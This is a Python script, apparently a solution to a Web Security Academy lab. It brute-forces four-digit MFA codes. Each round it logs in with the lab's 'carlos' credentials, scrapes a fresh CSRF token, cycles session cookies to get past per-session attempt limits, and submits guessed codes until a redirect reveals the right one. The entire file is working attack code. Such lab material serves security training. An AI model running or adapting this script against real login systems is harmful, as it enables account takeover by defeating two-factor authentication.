import time
import requests
from queue import Queue
from bs4 import BeautifulSoup

server_name = "0a5b00b7046f980b817e98be00160013"

base_url = f"https://{server_name}.web-security-academy.net"
url1 = f"{base_url}/login"
url2 = f"{base_url}/login2"

headers = {
    "Host": f"{server_name}.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

queue = Queue()


# Find the csrf token
def getCsrf(response_data):
    soup = BeautifulSoup(response_data.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token


# Check if the mfa is correct
def mfaCheck(response, temp_mfa):
    if response.status_code == 302:
        print(f"\n[*] MFA Code Found: {temp_mfa}")
        for key, value in response.headers.items():
            print(f"{key}: {value}")
            return 1
    else:
        print(f"[-] Tried {temp_mfa} | Response: {response.status_code}")
        return 0


def main():
    found = False

    # GET /Login -> To get a session key and a CSRF token.
    response = requests.get(url1, headers=headers, allow_redirects=False)

    while not found:
        for i in range(1500):
            queue.put(str(i).zfill(4))

        while not queue.empty():
            # POST /Login -> Logging in to the account.
            session = response.cookies.get_dict().get("session")
            headers["Cookie"] = f"session={session}"
            headers["Referer"] = url1
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            csrf = getCsrf(response)
            data = f"csrf={csrf}&username=carlos&password=montoya"
            headers["Content-Length"] = str(len(data))

            response = requests.post(url1, headers=headers, data=data, allow_redirects=False)

            # GET /Login2 -> The server generate an MFA by requesting the page
            session = response.cookies.get_dict().get("session")
            headers["Cookie"] = f"session={session}"
            headers["Referer"] = url2
            del headers["Content-Type"]
            del headers["Content-Length"]

            response = requests.get(url2, headers=headers, allow_redirects=False)

            # POST /Login2 (twice) -> Trying to log in with an MFA value.
            csrf = getCsrf(response)
            headers["Cookie"] = f"session={session}"
            headers["Referer"] = url2
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            for _ in range(2):
                temp_mfa = queue.get()
                data = f"csrf={csrf}&mfa-code={temp_mfa}"
                headers["Content-Length"] = str(len(data))
                response = requests.post(url2, headers=headers, data=data, allow_redirects=False)
                if mfaCheck(response, temp_mfa):
                    found = True
                    print(response.headers)
                    break

            if found:
                break


if __name__ == "__main__":
    main()
